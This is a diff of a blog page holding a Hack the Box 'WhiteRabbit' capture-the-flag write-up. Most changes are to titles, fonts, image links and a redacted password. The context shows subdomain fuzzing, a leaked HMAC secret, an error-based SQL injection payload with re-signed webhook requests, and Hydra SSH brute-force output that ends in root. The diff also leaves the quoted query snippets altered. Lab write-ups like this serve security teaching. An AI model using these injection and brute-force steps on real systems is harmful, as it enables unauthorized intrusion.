@@ -5,30 +5,33 @@
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  
-  <title>White Rabbit Writeup</title>
-  <meta name="description" content="">
+
+  <title>Hack the Box - WhiteRabbit</title>
+  <meta name="description"
+    content="">
 
   <link rel="stylesheet" href="/assets/css/style.css">
-  <link rel="canonical" href="http://localhost:4000/writeup/hackthebox/insane/2025/12/15/whiterabbit.html">
+  <link rel="canonical" href="http://localhost:4000/writeup/htb/2025/12/15/whiterabbit.html">
   <link rel="alternate" type="application/rss+xml" title="Naved124" href="/feed.xml">
-  
+
   <!-- Optional: Google Fonts for that extra techy feel -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500&family=Share+Tech+Mono&display=swap" rel="stylesheet">
-  
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&display=swap"
+    rel="stylesheet">
+
   <style>
     /* Override font-family if google font loads */
     body {
-        font-family: 'Share Tech Mono', 'Courier New', monospace;
+      font-family: 'JetBrains Mono', 'Courier New', monospace;
     }
-    code, pre {
-        font-family: 'Fira Code', monospace;
+
+    code,
+    pre {
+      font-family: 'JetBrains Mono', monospace;
     }
   </style>
 </head>
-
 
   <body>
 
@@ -49,13 +52,11 @@
         <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
 
   <header class="post-header">
-    <h1 class="post-title" itemprop="name headline">White Rabbit Writeup</h1>
+    <h1 class="post-title" itemprop="name headline">Hack the Box - WhiteRabbit</h1>
     <p class="post-meta">
       <time datetime="2025-12-15T00:00:00+05:30" itemprop="datePublished">
         Dec 15, 2025
       </time>
-      
-        • <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">DarkAngel79 (Naved khan)</span></span>
       
     </p>
   </header>
@@ -65,10 +66,27 @@
 
 <p><img src="/assets/white.png" alt="white.png" /></p>
 
-<h1 id="white-rabbit">White Rabbit</h1>
+<p><strong>Hack the box - White Rabbit</strong></p>
 
-<p><strong>Machine Creator</strong>: FLX0x00
-<strong>Difficulty</strong>: Insane</p>
+<p>OS: Linux</p>
+
+<p>Difficulty: Insane</p>
+
+<p>Platform: HackTheBox</p>
+
+<p>Box IP: 10.10.11.63</p>
+
+<p>Box Creator:  FLX0x00</p>
+
+<p>Author: DarkAngel79 (Naved Khan)</p>
+
+<p>Box Released: May 4, 2025</p>
+
+<p>Tools: Ghidra, John, FFUF, restic</p>
+
+<p>Writeup Updated: Dec 15, 2025</p>
+
+<p>Reference: (https://app.hackthebox.com/Machines/WhiteRabbit)</p>
 
 <p><strong>Synopsis</strong></p>
 <hr />
@@ -149,11 +167,11 @@ the HTTP port redirects to <code class="language-plaintext highlighter-rouge">wh
 10.10.11.63 whiterabbit.htb
 </code></pre></div></div>
 
-<p><img src="/assets/Pasted image 20251216095526.png" alt="Pasted image 20251216095526.png" /></p>
+<p><img src="/assets/Pasted%20image%2020251216095526.png" alt="Pasted image 20251216095526.png" /></p>
 
 <p>While navigating the website, we see a service for penetration testing being advertised. Checking out the <code class="language-plaintext highlighter-rouge">Latest News</code> section reveals services being used.</p>
 
-<p><img src="/assets/Pasted image 20251216095854.png" alt="Pasted image 20251216095854.png" /></p>
+<p><img src="/assets/Pasted%20image%2020251216095854.png" alt="Pasted image 20251216095854.png" /></p>
 
 <p>Now we begin <strong>subdomain enumeration</strong> to discover potential <code class="language-plaintext highlighter-rouge">virtual hosts</code>. There are multiple tools for performing this task but my personal favourite is <strong>ffuf</strong>.</p>
 
@@ -187,7 +205,7 @@ status                  [Status: 302, Size: 32, Words: 4, Lines: 1, Duration: 15
 
 <p>From this response we can see <code class="language-plaintext highlighter-rouge">status.whiterabbit.htb</code> is a virtual host thats active. We add that new entry to our /etc/hosts file. When navigating to the site we are presented with a <code class="language-plaintext highlighter-rouge">Uptime Kuma</code> login portal, but without credentials we can’t progress from here. By default in Kuma, there is a <code class="language-plaintext highlighter-rouge">/status</code> endpoint so we will perform a directory fuzz to see if we can discover any publicly accessible pages.</p>
 
-<p><img src="/assets/Pasted image 20251216101001.png" alt="Pasted image 20251216101001.png" /></p>
+<p><img src="/assets/Pasted%20image%2020251216101001.png" alt="Pasted image 20251216101001.png" /></p>
 
 <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-w</span> /usr/share/SecLists/Discovery/Web-Content/raft-small-words.txt <span class="nt">-u</span> http://status.whiterabbit.htb/status/FUZZ
 
@@ -217,40 +235,36 @@ temp                    [Status: 200, Size: 3359, Words: 304, Lines: 41, Duratio
 
 <p>Now accessing the http://status.whiterabbit.htb/status/temp page reveals a few subdomains.</p>
 
-<p><img src="/assets/Pasted image 20251216102608.png" alt="Pasted image 20251216102608.png" />
+<p><img src="/assets/Pasted%20image%2020251216102608.png" alt="Pasted image 20251216102608.png" />
 Accessing the <code class="language-plaintext highlighter-rouge">Wiki.js</code> link, we can navigate to Main menu then <code class="language-plaintext highlighter-rouge">GoPhish Webhooks</code> and read about the <code class="language-plaintext highlighter-rouge">n8n </code>workflow from a <code class="language-plaintext highlighter-rouge">GoPhish webhook</code> that works with phishing data and writes to database.</p>
 
-<p><img src="/assets/Pasted image 20251216103249.png" alt="Pasted image 20251216103249.png" /></p>
+<p><img src="/assets/Pasted%20image%2020251216103249.png" alt="Pasted image 20251216103249.png" /></p>
 
 <p>Scrolling down a bit reveals a <code class="language-plaintext highlighter-rouge">downloadable</code> file which is a live execution history of the workflow along with instructions on how to use the webhook itself.</p>
 
-<p><img src="/assets/Pasted image 20251216103421.png" alt="Pasted image 20251216103421.png" /></p>
+<p><img src="/assets/Pasted%20image%2020251216103421.png" alt="Pasted image 20251216103421.png" /></p>
 
 <p><strong>SQL Injection</strong></p>
 <hr />
 
 <p>We update our /etc/hosts file to add the <code class="language-plaintext highlighter-rouge">28efa8f7df.whiterabbit.htb</code>  subdomain. Analysing the <code class="language-plaintext highlighter-rouge">gophish_to_phishing_score_database.json</code>  reveals a potential SQL injection:</p>
 
-<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
-</span><span class="nl">"parameters"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">"parameters"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
 	</span><span class="nl">"operation"</span><span class="p">:</span><span class="w"> </span><span class="s2">"executeQuery"</span><span class="p">,</span><span class="w">
-	</span><span class="nl">"query"</span><span class="p">:</span><span class="w"> </span><span class="s2">"SELECT * FROM victims where email = </span><span class="se">\"</span><span class="s2">{{ $json.body.email }}</span><span class="se">\"</span><span class="s2"> LIMIT 1"</span><span class="p">,</span><span class="w">
+	</span><span class="nl">"query"</span><span class="p">:</span><span class="w"> </span><span class="s2">"SELECT * FROM victims where email = </span><span class="se">\"\"</span><span class="s2"> LIMIT 1"</span><span class="p">,</span><span class="w">
 	</span><span class="nl">"options"</span><span class="p">:</span><span class="w"> </span><span class="p">{}</span><span class="w">
 </span><span class="p">}</span><span class="err">,</span><span class="w">
-
 </span></code></pre></div></div>
 
 <p>This code will result in a direct injection for the email field and it should be possible to get an error based <code class="language-plaintext highlighter-rouge">SQL injection</code> because the debug node will provide the error messages. But there are some limitations. The <code class="language-plaintext highlighter-rouge">HTTP</code> request shown in the article works fine, but changing any data in the body will result in a failure because of the signature check that happens before any data is submitted to the database. This is because <code class="language-plaintext highlighter-rouge">GoPhish webhooks</code> can use a secret to sign the messages they send according to the documentation. Fortunately, the secret for the <code class="language-plaintext highlighter-rouge">HMAC</code> calculation is also leaked in the workflow <code class="language-plaintext highlighter-rouge">JSON</code> file and the information about the signing are available in the workflow and the <code class="language-plaintext highlighter-rouge">GoPhish</code> documentation.</p>
 
-<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
-</span><span class="nl">"parameters"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">"parameters"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span><span class="nl">"action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"hmac"</span><span class="p">,</span><span class="w">
 </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"SHA256"</span><span class="p">,</span><span class="w">
-</span><span class="nl">"value"</span><span class="p">:</span><span class="w"> </span><span class="s2">"={{ JSON.stringify($json.body) }}"</span><span class="p">,</span><span class="w">
+</span><span class="nl">"value"</span><span class="p">:</span><span class="w"> </span><span class="s2">"="</span><span class="p">,</span><span class="w">
 </span><span class="nl">"dataPropertyName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"calculated_signature"</span><span class="p">,</span><span class="w">
 </span><span class="nl">"secret"</span><span class="p">:</span><span class="w"> </span><span class="s2">"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"</span><span class="w">
 </span><span class="p">}</span><span class="err">,</span><span class="w">
-
 </span></code></pre></div></div>
 
 <p>We can edit the POST request  provided in the documentation to attempt a triggering of SQL injection .</p>
@@ -271,15 +285,15 @@ Content-Length: 81
 <span class="o">}</span>
 </code></pre></div></div>
 
-<p><img src="/assets/Pasted image 20251216110915.png" alt="Pasted image 20251216110915.png" /></p>
+<p><img src="/assets/Pasted%20image%2020251216110915.png" alt="Pasted image 20251216110915.png" /></p>
 
 <p>The reason for this is because the signature needs to be computed against the payload currently being used. To do this we will use <code class="language-plaintext highlighter-rouge">CyberChef</code> .</p>
 
-<p><img src="/assets/Pasted image 20251216105245.png" alt="Pasted image 20251216105245.png" /></p>
+<p><img src="/assets/Pasted%20image%2020251216105245.png" alt="Pasted image 20251216105245.png" /></p>
 
 <p>After replacing the <code class="language-plaintext highlighter-rouge">x-gophish-signature</code>  with the new one we just computed, we are able to trigger the error-based SQL injection.</p>
 
-<p><img src="/assets/Pasted image 20251216111322.png" alt="Pasted image 20251216111322.png" /></p>
+<p><img src="/assets/Pasted%20image%2020251216111322.png" alt="Pasted image 20251216111322.png" /></p>
 
 <p>From here, we can attempt to extract database names. For example, the following payload will extract the first database name that’s not like <code class="language-plaintext highlighter-rouge">information_schema</code> .</p>
 <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">"email"</span><span class="p">:</span><span class="w"> </span><span class="s2">"</span><span class="se">\"</span><span class="s2"> OR updatexml(1, concat(0x7e, (SELECT schema_name FROM
@@ -297,7 +311,7 @@ information_schema.schemata WHERE schema_name NOT LIKE </span><span class="se">\
   <li>Output appears in server error messages resulting in a classic error-based extraction.</li>
 </ul>
 
-<p><img src="/assets/Pasted image 20251216113543.png" alt="Pasted image 20251216113543.png" /></p>
+<p><img src="/assets/Pasted%20image%2020251216113543.png" alt="Pasted image 20251216113543.png" /></p>
 
 <p>Now that we have a successful injection point and a way to produce output, we can script this to perform a full dump using Python. We create a tamper function which will encode the payloads using the secret and append the payload to the POST parameters, since this is a error-based injection that only displays one entry at a time, we need to loop over in a range to extract all values correctly. To limit the output I restricted the output for the specific data we are looking for.</p>
 
@@ -810,7 +824,7 @@ neo-password-generator                                                          
 
 <p>Now we import the binary into <code class="language-plaintext highlighter-rouge">Ghidra</code> and begin analysing the structure of the <code class="language-plaintext highlighter-rouge">ELF binary</code> . Taking a look at the <code class="language-plaintext highlighter-rouge">main</code> function, we see the following:</p>
 
-<p><img src="/assets/Pasted image 20251216142550.png" alt="Pasted image 20251216142550.png" /></p>
+<p><img src="/assets/Pasted%20image%2020251216142550.png" alt="Pasted image 20251216142550.png" /></p>
 
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
 <span class="p">{</span>
@@ -1110,7 +1124,7 @@ Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span cl
 <span class="o">[</span>WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use <span class="nt">-t</span> 4
 <span class="o">[</span>DATA] max 16 tasks per 1 server, overall 16 tasks, 1000 login tries <span class="o">(</span>l:1/p:1000<span class="o">)</span>, ~63 tries per task
 <span class="o">[</span>DATA] attacking ssh://whiterabbit.htb:22/
-<span class="o">[</span>22][ssh] host: whiterabbit.htb   login: neo   password: WBSxhWgfnMiclrV4dqfj
+<span class="o">[</span>22][ssh] host: whiterabbit.htb   login: neo   password: <span class="o">[</span>REDACTED]
 1 of 1 target successfully completed, 1 valid password found
 <span class="o">[</span>WARNING] Writing restore file because 1 final worker threads did not <span class="nb">complete </span><span class="k">until </span>end.
 <span class="o">[</span>ERROR] 1 target did not resolve or could not be connected
@@ -1163,7 +1177,9 @@ root@whiterabbit:/home/neo# ls -l /root/root.txt
     <footer>
     <div class="container">
         <p>&copy; 2025 Naved Khan. All rights reserved.</p>
-        <p>Powered by <a href="https://jekyllrb.com/">Jekyll</a> & <span style="color: #ff0000;">&hearts;</span></p>
+        <p>Powered by <a href="https://jekyllrb.com/">Jekyll</a> & <span
+                style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol';">☕</span>
+        </p>
         <div class="scancode">
             Scanning port 80... [OPEN]
         </div>
